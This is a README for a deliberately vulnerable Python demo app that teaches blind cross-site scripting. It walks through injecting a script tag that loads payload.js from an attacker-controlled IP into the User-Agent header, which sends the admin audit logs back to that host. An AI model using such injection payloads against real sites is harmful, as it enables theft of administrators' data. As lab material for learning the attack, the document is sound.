# blindxss
## This is a vulnerable application written is python to demonstrate a blind XSS scenario

## Requirements
- Need python 2 or 3

## setup
- pip install -r requirements.txt

## how to run
```sh
python server.py
```

Open the browser and navigate to [http://127.0.0.1:8090](http://127.0.0.1:8090)

## steps to reproduce
### raise a local python server in your machine 
```sh
### cd to the directory where you download the code
### in case of python3
python -m http.server 9090
### in case of python 2
python -m SimpleHTTPServer 9090
```

## open payload.js
- line number 7 replace it with loopback ip if you are playing in the same box, if you raise the python server on different machine then you can grab that IP and replace it with attackerIP

## reproduce the attack
- using burp intercept the response for [http://127.0.0.1:8090/logins](http://127.0.0.1:8090/logins).
- add some special char in username and password POST parameter request body that you have intercepted in the above step.
- now change the "User-Agent" value to <script src=http://IPaddress:9090/payload.js></script> of the same intercepted request and send the request.
- Once you visit the http://127.0.0.1:8090/adminLogAudit on the machine where you are running the server.py. It will execute the injected javascript and sends back the whole auditLogs to AttackerIP that you have mentioned in payload.js (note: /adminLogAudit can me only accessed from the app where its running)
